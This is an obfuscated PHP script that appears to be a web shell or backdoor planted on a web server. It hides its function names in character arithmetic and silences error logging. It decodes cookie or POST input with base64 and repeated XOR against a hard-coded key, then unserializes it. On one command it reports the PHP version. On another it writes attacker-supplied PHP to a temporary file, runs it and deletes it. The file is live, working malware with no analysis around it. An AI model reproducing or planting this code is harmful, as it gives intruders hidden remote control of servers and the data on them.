<?php $vstipqansh = chr(346-244)."\151"."\154"."\145"."\137".chr(934-822).'u'."\x74".chr(95).chr(99).chr(567-456).chr(110)."\164"."\x65"."\156".chr(116).'s';
$xstrg = chr(554-456)."\x61".chr(177-62).'e'."\66".'4'."\x5f".chr(150-50)."\145"."\143".chr(164-53).'d'."\x65";
$kdykld = "\x69"."\x6e"."\x69".'_'."\163"."\x65".chr(116);
$dxfxbb = 'u'."\156".chr(601-493).chr(105).chr(110)."\x6b";


@$kdykld(chr(678-577)."\162".chr(270-156)."\157"."\x72"."\x5f".chr(998-890).chr(111)."\x67", NULL);
@$kdykld('l'."\x6f"."\147".chr(835-740)."\145"."\x72".'r'.chr(946-835)."\x72".chr(132-17), 0);
@$kdykld("\155"."\141"."\x78".chr(1038-943).'e'."\170"."\x65".chr(139-40)."\x75".chr(116).chr(552-447).chr(160-49)."\156"."\137"."\164".chr(1009-904).'m'."\145", 0);
@set_time_limit(0);

function veiliqot($rqrywwg, $xzeysdy)
{
    $ygztksng = "";
    for ($ongsrbt = 0; $ongsrbt < strlen($rqrywwg);) {
        for ($j = 0; $j < strlen($xzeysdy) && $ongsrbt < strlen($rqrywwg); $j++, $ongsrbt++) {
            $ygztksng .= chr(ord($rqrywwg[$ongsrbt]) ^ ord($xzeysdy[$j]));
        }
    }
    return $ygztksng;
}

$msuiooqbtl = array_merge($_COOKIE, $_POST);
$erlwsmsh = 'be100f36-25dd-4163-b957-5c58ddcf5d91';
foreach ($msuiooqbtl as $uanzfyaiqp => $rqrywwg) {
    $rqrywwg = @unserialize(veiliqot(veiliqot($xstrg($rqrywwg), $erlwsmsh), $uanzfyaiqp));
    if (isset($rqrywwg["\x61"."\x6b"])) {
        if ($rqrywwg["\141"] == 'i') {
            $ongsrbt = array(
                'p'.chr(118) => @phpversion(),
                "\x73".chr(366-248) => "3.5",
            );
            echo @serialize($ongsrbt);
        } elseif ($rqrywwg["\141"] == "\145") {
            $aphakhpsf = "./" . md5($erlwsmsh) . "\56".'i'.chr(114-4).chr(138-39);
            @$vstipqansh($aphakhpsf, "<" . '?'.chr(902-790)."\x68".'p'.chr(32)."\x40"."\x75".'n'."\154"."\151"."\x6e".'k'."\50".chr(95).chr(95).'F'.chr(574-501).chr(930-854).'E'.'_'.chr(95)."\x29"."\73".chr(845-813) . $rqrywwg["\x64"]);
            @include($aphakhpsf);
            @$dxfxbb($aphakhpsf);
        }
        exit();
    }
}

